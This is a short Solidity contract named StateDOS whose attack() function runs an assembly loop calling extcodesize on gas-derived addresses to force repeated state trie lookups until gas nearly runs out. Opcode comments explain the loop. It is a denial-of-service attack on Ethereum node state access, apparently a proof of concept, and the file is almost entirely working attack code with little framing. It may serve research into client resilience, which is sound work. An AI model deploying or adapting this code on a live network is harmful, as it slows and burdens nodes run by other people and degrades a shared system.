// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract StateDOS {
    bool public hasRun = false;

    function attack() public {
        //  jumpdest     ; jump label, start of loop
        // 	gas          ; get a 'random' value on the stack
        // 	extcodesize  ; trigger trie lookup
        // 	pop          ; ignore the extcodesize result
        // 	push1 0x00   ; jump label dest
        // 	jump         ; jump back to start

        assembly {
            let thegas := gas()

        // While greater than 23000 gas. This will let us SSTORE at the end.
            for { } gt(thegas, 0x59D8) { } {
                thegas := gas()
                let ignoredext := extcodesize(thegas)
            }
        }
        hasRun = true; // Sanity check
    }
}